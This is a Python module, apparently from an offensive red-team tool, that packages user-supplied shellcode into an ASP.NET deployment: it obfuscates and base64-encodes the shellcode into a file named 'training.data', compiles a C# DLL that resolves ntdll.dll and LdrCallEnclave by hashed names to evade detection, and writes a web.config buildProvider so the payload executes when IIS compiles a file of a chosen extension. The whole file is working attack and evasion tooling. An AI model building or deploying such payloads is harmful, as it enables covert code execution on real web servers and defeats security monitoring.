import os
import shutil
import tempfile
import datetime
import sys
import random
from base64 import b64encode
import zipfile

from .misc import is_valid_csharp_classname
from .consts import TEMPLATE_DIR
from .mutator import Mutator
from .misc import get_api_hash, run_cmd_check_file

class ASPxecute:
    def __init__(self, shellcode, namespace, classname, ext):
        self._tempdir = tempfile.TemporaryDirectory()
        self.tempdir = self._tempdir.name
        self.shellcode = shellcode
        self.namespace = namespace 
        self.classname = classname
        self.ext = ext 
        self.build_cmd = f"msbuild /property:Configuration=Release /property:Platform=x64 /restore"

    def validate(self):
        # Validate Valid classname and namespace 
        if not is_valid_csharp_classname(self.classname):
            print("[-] Invalid C# ClassName")
            sys.exit(-1)
        
        if not is_valid_csharp_classname(self.namespace):
            print("[-] Invalid C# Namespace")
            sys.exit(-1)

        # Validate shellcode 
        if not os.path.exists(self.shellcode):
            print("[-] Could not locate ", self.shellcode)
            sys.exit(-1)

        # Validate extension
        while self.ext.startswith("."):
            print("[i] Discarding the `.` in extension name")
            self.ext = self.ext[1:]

    def template(self):
        # First create the output dir
        output_dir = os.path.join(self.tempdir, "output")
        os.makedirs(output_dir, exist_ok=True)

        # Create the bin and App_Code dir
        bin_dir = os.path.join(output_dir, "bin")
        appcode_dir = os.path.join(output_dir, "App_Code")
        os.makedirs(bin_dir, exist_ok=True)
        os.makedirs(appcode_dir, exist_ok=True)

        # Create web.config file
        web_config = os.path.join(output_dir, "web.config")
        with open(web_config, "w") as f:
            web_config_data = f"""<?xml version="1.0"?>
<configuration>
    <system.web>
        <compilation debug="true">
            <buildProviders>
                <add extension=".{self.ext}" type="{self.namespace}.{self.classname}, {self.namespace}"/>
            </buildProviders>
        </compilation>
    </system.web>
</configuration>
"""
            f.write(web_config_data)
            print("[+] Wrote web.config to:     ", web_config)

        # Create extension file
        now = datetime.datetime.now()
        timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
        filename = os.path.join(appcode_dir, f"{timestamp}.{self.ext}")

        with open(filename, 'w') as f:
            pass
        print("[+] Created extension file:  ", filename)

        with open(self.shellcode, 'rb') as f:
            byte_data = f.read()
            mutator = Mutator(list(byte_data))
            # mutator.inflate = True
            enc_shellcode = b64encode(mutator.generate()).decode(encoding='utf-8')
            shellcode_file = os.path.join(output_dir, "training.data")
            with open(shellcode_file, 'w') as fw:
                fw.write(enc_shellcode)
                print("[+] Wrote Shellcode file to: ", shellcode_file)


    def generate_payload(self):
        # Copy template files into build dir
        build_dir = os.path.join(self.tempdir, "build")
        shutil.copytree(TEMPLATE_DIR, build_dir)
        ntdll_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
        ldrce_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
        ntdll_hash = get_api_hash("ntdll.dll", ntdll_key)
        ldrce_hash = get_api_hash("LdrCallEnclave", ldrce_key)
        program_cs = os.path.join(build_dir, "Program.cs")        
        
        with open(program_cs, "r") as f:
            content = f.read()
            with open(program_cs, "w") as fw:
                content = content.replace("NTDLL_KEY", hex(ntdll_key)).replace("LDRCE_KEY", hex(ldrce_key))
                content = content.replace("NTDLL_HASH", ntdll_hash).replace("LDRCE_HASH", ldrce_hash)
                content = content.replace("BYOBNAMESPACE", self.namespace).replace("BYOBCLASS", self.classname)
                fw.write(content)
                print("[+] Prepared Program.cs for compilation")

        os.rename(
            os.path.join(build_dir, "project.csproj"),
            os.path.join(build_dir, f"{self.namespace}.csproj")
        )

        build_dll = os.path.join(build_dir, "bin", "x64", "Release", f"{self.namespace}.dll")
        curr_dir = os.getcwd()
        os.chdir(build_dir)
        run_cmd_check_file(self.build_cmd, build_dll)
        os.chdir(curr_dir)

        print("[+] Successfully created payload DLL: ", build_dll)

        shutil.move(
            build_dll, 
            os.path.join(self.tempdir, "output", "bin")
        )

    def zip_directory(self, folder_path, output_zip_path):
        """
        Recursively zips the contents of folder_path into a zip file at output_zip_path.
        
        :param folder_path: Path to the directory to be zipped.
        :param output_zip_path: Path (including .zip filename) where the zip will be created.
        """
        folder_path = os.path.abspath(folder_path)
        with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Add file to zip with relative path
                    arcname = os.path.relpath(file_path, start=folder_path)
                    zipf.write(file_path, arcname)
        print(f"[+] Zipped contents of '{folder_path}' into '{output_zip_path}'")